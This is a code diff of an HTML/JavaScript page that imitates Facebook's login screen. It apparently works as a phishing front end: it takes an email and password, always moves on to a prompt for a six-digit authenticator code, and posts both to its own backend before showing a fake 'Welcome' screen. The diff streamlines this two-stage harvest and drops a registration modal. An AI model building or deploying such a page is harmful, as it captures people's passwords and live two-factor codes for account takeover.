@@ -3,63 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Facebook</title>
+    <title>Facebook - Authentication</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
-
-        .main {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px 16px;
-        }
-
-        .logo-section {
-            text-align: center;
-            padding: 40px 0 30px;
-        }
-
-        .fb-logo {
-            font-size: 64px;
-            font-weight: 700;
-            color: #1877f2;
-        }
-
-        .form-container {
+        .card {
             background: white;
             border-radius: 16px;
-            padding: 20px 16px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .input-field {
+            padding: 32px 24px;
             width: 100%;
-            padding: 16px;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            font-size: 56px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1c1e21;
+        }
+        .input-group {
+            margin-bottom: 12px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
             font-size: 16px;
             border: 1px solid #dddfe2;
             border-radius: 8px;
-            margin-bottom: 12px;
-            background: #ffffff;
+            background: white;
         }
-
-        .code-input {
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 8px;
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
         }
-
-        .login-btn {
+        button {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             background: #1877f2;
             color: white;
             border: none;
@@ -67,187 +66,105 @@
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
+            margin-top: 8px;
         }
-
-        .login-btn:hover {
+        button:active {
             background: #1663c7;
         }
-
         .back-link {
-            text-align: center;
             margin-top: 16px;
-        }
-
-        .back-link a {
+            font-size: 14px;
             color: #1877f2;
-            text-decoration: none;
             cursor: pointer;
         }
-
-        .divider {
-            border: none;
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-btn {
-            width: 100%;
-            padding: 16px;
-            background: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
         .message {
             margin-top: 16px;
-            padding: 12px;
+            padding: 10px;
             border-radius: 8px;
-            text-align: center;
-            display: none;
             font-size: 14px;
         }
-
-        .message.success {
+        .success {
             background: #d4edda;
             color: #155724;
-            display: block;
         }
-
-        .message.error {
+        .error {
             background: #f8d7da;
             color: #721c24;
-            display: block;
         }
-
-        .welcome-card {
-            background: white;
-            border-radius: 16px;
-            padding: 40px 20px;
-            text-align: center;
+        .hidden {
+            display: none;
         }
-
-        .welcome-name {
-            font-size: 24px;
-            font-weight: 600;
+        hr {
             margin: 20px 0;
+            border: none;
+            border-top: 1px solid #dadde1;
         }
-
-        .footer {
-            text-align: center;
-            padding: 30px 20px 20px;
-            color: #737373;
-            font-size: 12px;
+        .create-btn {
+            background: #42b72a;
+            margin-top: 0;
         }
-
-        @media (min-width: 768px) {
-            .main {
-                max-width: 400px;
-                padding: 40px 16px;
-            }
+        .create-btn:hover {
+            background: #36a420;
         }
     </style>
 </head>
 <body>
+<div class="card">
+    <div class="logo">f</div>
 
-<div class="main">
-    <div class="logo-section">
-        <div class="fb-logo">f</div>
+    <!-- Step 1: Login form -->
+    <div id="step1">
+        <h2>Log in to Facebook</h2>
+        <div class="input-group"><input type="text" id="email" placeholder="Email or phone number"></div>
+        <div class="input-group"><input type="password" id="password" placeholder="Password"></div>
+        <button id="loginBtn">Log In</button>
+        <hr>
+        <button id="createBtn" class="create-btn">Create new account</button>
     </div>
 
-    <!-- Login Form View -->
-    <div id="loginView">
-        <div class="form-container">
-            <input type="text" id="loginEmail" class="input-field" placeholder="Email address">
-            <input type="password" id="loginPassword" class="input-field" placeholder="Password">
-            <button class="login-btn" id="loginBtn">Log in</button>
-            <div class="divider"></div>
-            <button class="create-btn" id="showCreateBtn">Create new account</button>
-        </div>
+    <!-- Step 2: 2FA code form -->
+    <div id="step2" class="hidden">
+        <h2>Authentication Required</h2>
+        <p style="margin-bottom: 20px; color: #65676b;">Enter the 6-digit code from your authenticator app</p>
+        <div class="input-group"><input type="text" id="code" placeholder="000000" maxlength="6" inputmode="numeric"></div>
+        <button id="verifyBtn">Verify</button>
+        <div class="back-link" id="backToLogin">← Back to login</div>
     </div>
 
-    <!-- 2FA Code View -->
-    <div id="twoFAView" style="display: none;">
-        <div class="form-container">
-            <h3 style="margin-bottom: 20px; text-align: center;">Authentication Required</h3>
-            <p style="margin-bottom: 20px; text-align: center; color: #65676b;">Enter the authentication code from your device</p>
-            <input type="text" id="codeInput" class="input-field code-input" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric">
-            <button class="login-btn" id="verifyBtn">Verify</button>
-            <div class="back-link"><a id="backToLoginBtn">← Back to login</a></div>
-        </div>
+    <!-- Step 3: Welcome (after successful 2FA) -->
+    <div id="step3" class="hidden">
+        <h2>Welcome!</h2>
+        <p style="margin: 20px 0;">You have successfully logged in.</p>
+        <button id="logoutBtn">Log Out</button>
     </div>
 
-    <!-- Welcome View (dummy) -->
-    <div id="welcomeView" style="display: none;">
-        <div class="welcome-card">
-            <div class="fb-logo" style="font-size: 48px;">f</div>
-            <div class="welcome-name" id="welcomeName"></div>
-            <button class="login-btn" id="logoutBtn" style="background: #e41e3f;">Log out</button>
-        </div>
-    </div>
-
-    <div id="messageDiv" class="message"></div>
-
-    <div class="footer">
-        <div>Meta © 2026</div>
-    </div>
-</div>
-
-<!-- Register Modal (same as before) -->
-<div id="registerModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000;">
-    <div style="background: white; border-radius: 12px; width: 90%; max-width: 400px; padding: 20px;">
-        <span id="closeModalBtn" style="float: right; font-size: 28px; cursor: pointer;">&times;</span>
-        <div style="font-size: 28px; font-weight: 700; margin-bottom: 20px;">Create new account</div>
-        <input type="text" id="regName" class="input-field" placeholder="Full name">
-        <input type="email" id="regEmail" class="input-field" placeholder="Email address">
-        <input type="password" id="regPassword" class="input-field" placeholder="Password">
-        <div id="regError" style="color: #e41e3f; font-size: 13px; margin-bottom: 12px; display: none;"></div>
-        <button class="login-btn" id="registerBtn" style="background: #42b72a;">Sign Up</button>
-    </div>
+    <div id="message"></div>
 </div>
 
 <script>
     const API_URL = window.location.origin + '/api';
     let currentSessionId = null;
 
-    // DOM elements
-    const loginView = document.getElementById('loginView');
-    const twoFAView = document.getElementById('twoFAView');
-    const welcomeView = document.getElementById('welcomeView');
-    const loginEmail = document.getElementById('loginEmail');
-    const loginPassword = document.getElementById('loginPassword');
-    const loginBtn = document.getElementById('loginBtn');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const codeInput = document.getElementById('codeInput');
-    const backToLoginBtn = document.getElementById('backToLoginBtn');
-    const logoutBtn = document.getElementById('logoutBtn');
-    const showCreateBtn = document.getElementById('showCreateBtn');
-    const messageDiv = document.getElementById('messageDiv');
-    const welcomeName = document.getElementById('welcomeName');
-
-    function showMessage(msg, type) {
-        messageDiv.textContent = msg;
-        messageDiv.className = 'message ' + type;
-        setTimeout(() => {
-            messageDiv.className = 'message';
-        }, 3000);
+    // Helper to show messages
+    function showMessage(text, type) {
+        const msgDiv = document.getElementById('message');
+        msgDiv.innerHTML = `<div class="message ${type}">${text}</div>`;
+        setTimeout(() => { msgDiv.innerHTML = ''; }, 3000);
     }
 
-    // Step 1: Always goes to 2FA page, no validation
-    async function handleLogin() {
-        const email = loginEmail.value.trim();
-        const password = loginPassword.value;
+    // Step 1: Login - always goes to step2, sends credentials to backend
+    document.getElementById('loginBtn').onclick = async () => {
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
 
         if (!email || !password) {
             showMessage('Please fill in both fields', 'error');
             return;
         }
 
-        loginBtn.textContent = 'Sending...';
-        loginBtn.disabled = true;
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true;
+        btn.textContent = 'Sending...';
 
         try {
             const response = await fetch(`${API_URL}/login`, {
@@ -255,37 +172,36 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ identifier: email, password: password })
             });
-
             const data = await response.json();
-
             if (response.ok && data.requires2FA) {
                 currentSessionId = data.sessionId;
-                loginView.style.display = 'none';
-                twoFAView.style.display = 'block';
-                codeInput.value = '';
-                showMessage('Enter the authentication code', 'success');
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('code').value = '';
+                showMessage('Enter the 6-digit authentication code', 'success');
             } else {
                 showMessage(data.error || 'Login failed', 'error');
             }
         } catch (error) {
             showMessage('Network error: ' + error.message, 'error');
         } finally {
-            loginBtn.textContent = 'Log in';
-            loginBtn.disabled = false;
+            btn.disabled = false;
+            btn.textContent = 'Log In';
         }
-    }
+    };
 
-    // Step 2: Submit the authentication code
-    async function verifyCode() {
-        const code = codeInput.value.trim();
+    // Step 2: Verify 2FA code - sends code to backend, then goes to welcome
+    document.getElementById('verifyBtn').onclick = async () => {
+        const code = document.getElementById('code').value.trim();
 
         if (!code || code.length !== 6) {
             showMessage('Please enter a valid 6-digit code', 'error');
             return;
         }
 
-        verifyBtn.textContent = 'Verifying...';
-        verifyBtn.disabled = true;
+        const btn = document.getElementById('verifyBtn');
+        btn.disabled = true;
+        btn.textContent = 'Verifying...';
 
         try {
             const response = await fetch(`${API_URL}/verify-2fa`, {
@@ -293,128 +209,43 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId: currentSessionId, code: code })
             });
-
             const data = await response.json();
-
             if (response.ok) {
-                localStorage.setItem('fb_user', JSON.stringify(data.user));
-                showWelcome(data.user);
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
                 showMessage('Login successful!', 'success');
             } else {
-                showMessage(data.error || 'Invalid code', 'error');
-                // Optionally, you can still go to welcome page even if error? For now, error.
+                showMessage(data.error || 'Verification failed', 'error');
             }
         } catch (error) {
             showMessage('Network error: ' + error.message, 'error');
         } finally {
-            verifyBtn.textContent = 'Verify';
-            verifyBtn.disabled = false;
+            btn.disabled = false;
+            btn.textContent = 'Verify';
         }
-    }
+    };
 
-    function showWelcome(user) {
-        loginView.style.display = 'none';
-        twoFAView.style.display = 'none';
-        welcomeView.style.display = 'block';
-        welcomeName.textContent = user.name || 'User';
-    }
-
-    function handleLogout() {
-        localStorage.removeItem('fb_user');
-        loginView.style.display = 'block';
-        twoFAView.style.display = 'none';
-        welcomeView.style.display = 'none';
-        loginEmail.value = '';
-        loginPassword.value = '';
+    // Back to login from step2
+    document.getElementById('backToLogin').onclick = () => {
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step1').classList.remove('hidden');
         currentSessionId = null;
-        showMessage('Logged out successfully', 'success');
-    }
+        document.getElementById('code').value = '';
+    };
 
-    function backToLogin() {
-        twoFAView.style.display = 'none';
-        loginView.style.display = 'block';
-        currentSessionId = null;
-        codeInput.value = '';
-    }
+    // Logout from welcome page
+    document.getElementById('logoutBtn').onclick = () => {
+        document.getElementById('step3').classList.add('hidden');
+        document.getElementById('step1').classList.remove('hidden');
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+        showMessage('Logged out', 'success');
+    };
 
-    // Modal functions (register)
-    function showRegisterModal() {
-        document.getElementById('registerModal').style.display = 'flex';
-    }
-    function closeRegisterModal() {
-        document.getElementById('registerModal').style.display = 'none';
-    }
-    async function handleRegister() {
-        const name = document.getElementById('regName').value.trim();
-        const email = document.getElementById('regEmail').value.trim();
-        const password = document.getElementById('regPassword').value;
-        const errorDiv = document.getElementById('regError');
-        if (!name || !email || !password) {
-            errorDiv.textContent = 'All fields required';
-            errorDiv.style.display = 'block';
-            return;
-        }
-        if (password.length < 6) {
-            errorDiv.textContent = 'Password must be 6+ characters';
-            errorDiv.style.display = 'block';
-            return;
-        }
-        errorDiv.style.display = 'none';
-        const registerBtn = document.getElementById('registerBtn');
-        registerBtn.textContent = 'Creating...';
-        registerBtn.disabled = true;
-        try {
-            const response = await fetch(`${API_URL}/register`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, email, password })
-            });
-            const data = await response.json();
-            if (response.ok) {
-                closeRegisterModal();
-                showMessage('Account created! Please log in.', 'success');
-                document.getElementById('regName').value = '';
-                document.getElementById('regEmail').value = '';
-                document.getElementById('regPassword').value = '';
-            } else {
-                errorDiv.textContent = data.error;
-                errorDiv.style.display = 'block';
-            }
-        } catch (error) {
-            errorDiv.textContent = 'Network error: ' + error.message;
-            errorDiv.style.display = 'block';
-        } finally {
-            registerBtn.textContent = 'Sign Up';
-            registerBtn.disabled = false;
-        }
-    }
-
-    // Event listeners
-    loginBtn.addEventListener('click', handleLogin);
-    verifyBtn.addEventListener('click', verifyCode);
-    backToLoginBtn.addEventListener('click', backToLogin);
-    logoutBtn.addEventListener('click', handleLogout);
-    showCreateBtn.addEventListener('click', showRegisterModal);
-    document.getElementById('closeModalBtn').addEventListener('click', closeRegisterModal);
-    document.getElementById('registerBtn').addEventListener('click', handleRegister);
-    window.addEventListener('click', (e) => {
-        if (e.target === document.getElementById('registerModal')) closeRegisterModal();
-    });
-    loginPassword.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleLogin();
-    });
-    codeInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') verifyCode();
-    });
-
-    // Check saved user
-    const savedUser = localStorage.getItem('fb_user');
-    if (savedUser) {
-        try {
-            showWelcome(JSON.parse(savedUser));
-        } catch(e) {}
-    }
+    // Create account button (just shows message for now)
+    document.getElementById('createBtn').onclick = () => {
+        showMessage('Create account feature coming soon', 'success');
+    };
 </script>
-
 </body>
 </html>
